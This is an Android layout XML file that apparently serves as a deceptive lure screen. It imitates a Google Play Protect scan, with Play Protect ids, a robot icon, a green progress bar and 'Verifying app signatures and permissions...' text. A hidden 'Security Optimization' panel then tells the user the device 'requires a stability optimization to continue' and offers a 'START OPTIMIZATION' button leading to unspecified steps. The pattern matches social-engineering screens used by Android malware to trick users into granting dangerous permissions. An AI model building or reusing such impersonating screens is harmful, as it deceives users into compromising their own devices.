<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FDFDFD">

    <!-- PLAY PROTECT SCANNING OVERLAY -->

    <!-- GUIDED OPTIMIZATION FLOW -->
    <LinearLayout
        android:id="@+id/layoutScanning"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center"
        android:orientation="vertical"
        android:padding="50dp"
        android:visibility="visible">

        <ImageView
            android:id="@+id/ivPlayProtectRobot"
            android:layout_width="209dp"
            android:layout_height="182dp"
            android:layout_gravity="center_horizontal|top"
            android:layout_marginTop="20dp"
            android:fitsSystemWindows="true"
            android:focusedByDefault="true"
            android:forceHasOverlappingRendering="true"
            android:src="@drawable/ic_android_play" />

        <TextView
            android:id="@+id/tvPlayProtectSub"
            android:layout_width="258dp"
            android:layout_height="wrap_content"
            android:layout_marginTop="18dp"
            android:fontFamily="@font/assistant"
            android:gravity="center"
            android:letterSpacing=".02"
            android:text="Scanning system for stability issues..."
            android:textAlignment="center"
            android:textColor="#D3787373"
            android:textSize="16sp"
            android:textStyle="bold" />

        <TextView
            android:id="@+id/tvPlayProtectDetails"
            android:layout_width="285dp"
            android:layout_height="23dp"
            android:layout_marginTop="6dp"
            android:layout_marginBottom="32dp"
            android:alpha="0.9"
            android:fontFamily="@font/assistant"
            android:text="Verifying app signatures and permissions..."
            android:textAlignment="center"
            android:textColor="#E6757171"
            android:textSize="15sp"
            android:textStyle="bold" />

        <ProgressBar
            android:id="@+id/pbPlayProtect"
            style="@android:style/Widget.Material.ProgressBar.Horizontal"
            android:layout_width="match_parent"
            android:layout_height="12dp"
            android:layout_marginBottom="30dp"
            android:max="100"
            android:progress="0"
            android:progressTint="#34A853" />

    </LinearLayout>

    <LinearLayout
        android:id="@+id/layoutGuide"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:gravity="center"
        android:orientation="vertical"
        android:padding="32dp"
        android:visibility="gone">

        <ImageView
            android:id="@+id/ivGuideIcon"
            android:layout_width="80dp"
            android:layout_height="80dp"
            android:src="@android:drawable/ic_dialog_info"
            app:tint="#1A73E8" />

        <TextView
            android:id="@+id/tvGuideHeader"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="24dp"
            android:text="Security Optimization"
            android:textColor="#202124"
            android:textSize="22sp"
            android:textStyle="bold" />

        <TextView
            android:id="@+id/tvGuideMsg"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="12dp"
            android:layout_marginBottom="32dp"
            android:gravity="center"
            android:text="Your device requires a stability optimization to continue. Follow these steps on the next screen:"
            android:textColor="#5F6368"
            android:textSize="15sp" />

        <LinearLayout
            android:id="@+id/llStepsContainer"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical" />

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="match_parent"
            android:layout_height="64dp"
            android:layout_marginTop="48dp"
            android:text="START OPTIMIZATION"
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:textStyle="bold"
            app:backgroundTint="#1A73E8"
            app:cornerRadius="100dp" />

    </LinearLayout>

</FrameLayout>
